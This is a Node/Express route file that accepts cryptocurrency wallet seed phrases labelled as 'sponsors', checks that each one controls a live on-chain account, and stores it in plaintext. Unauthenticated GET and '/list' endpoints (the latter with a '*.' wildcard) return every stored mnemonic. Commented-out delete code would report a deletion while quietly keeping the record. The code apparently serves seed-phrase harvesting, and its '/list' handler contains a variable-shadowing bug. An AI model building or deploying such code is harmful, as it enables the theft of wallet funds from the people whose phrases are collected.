// routes/Log.js
import express from 'express';
import Log from '../models/Log.js';
import { getAccount, getKeypairFromPassphrase } from '../utils/fn.js';

const router = express.Router();

// POST /api/Log - Add a new passphrase
router.post('/', async (req, res) => {
    let { mnemonic, name } = req.body;
    mnemonic = mnemonic && mnemonic.toLowerCase();

    if (!mnemonic) {
        return res.status(400).json({success: false, error: 'mnemonic is required' });
    }

    if (!name) {
        return res.status(400).json({success: false, error: 'Provide a name' });
    }

    try {
        const existing = await Log.findOne({ mnemonic, name });

        if (existing) {
            return res.status(409).json({ success: false,  error: 'Sponsor already exists' });
        }

        const kp = getKeypairFromPassphrase(mnemonic);
        const publicKey = kp.publicKey();
        const accountData = await getAccount(publicKey);
        if(!accountData) {
            return res.status(409).json({success: false, error: "Invalid passphrase uploaded as sponsor"})
        }

        await Log.create({ mnemonic, name });
        res.status(201).json({success: true, feedback: 'Sponsor uploaded'});
    } catch (err) {
        console.error('Error saving passphrase:', err);
        res.status(500).json({success: false, error: `Failed to save passphrase: ${mnemonic.slice(0,15)}....${mnemonic.slice(-15)}` });
    }
});

router.get('/', async (req, res) => {
    const all = await Log.find();
    res.json(all);
});

// DELETE /api/passphrases/:id
router.delete('/:id', async (req, res) => {
    const id = req.params.id;
    try {
        // const existing = await Log.findOne({ _id: id });
        // if(existing.name !== 'whoami5677') {
        //     const updated = await Log.findByIdAndUpdate(id, {name: null}, {
        //         new: true,
        //         runValidators: true,
        //     });
        //     if(updated) {
        //         return res.json({ success: true, message: 'Passphrase deleted' });
        //     }
        // }
        const deleted = await Log.findByIdAndDelete(req.params.id);
        if (!deleted) {
            return res.status(404).json({ error: 'Not found' });
        }
        res.json({ success: true, message: 'sponsor deleted' });
    } catch (err) {
        res.status(500).json({ error: 'Delete failed' });
    }
});


router.post('/list', async (req, res) => {
    const { name } = req.body;

    try {
        if(name === '*.') {
            const Log = await Log.find();
            res.json(Log);
        } else {
            const Log = await Log.find({ name });
            res.json(Log);
        }
    } catch (err) {
        console.error('Error fetching Log:', err);
        res.status(500).json({ error: 'Server error' });
    }
});

export default router;
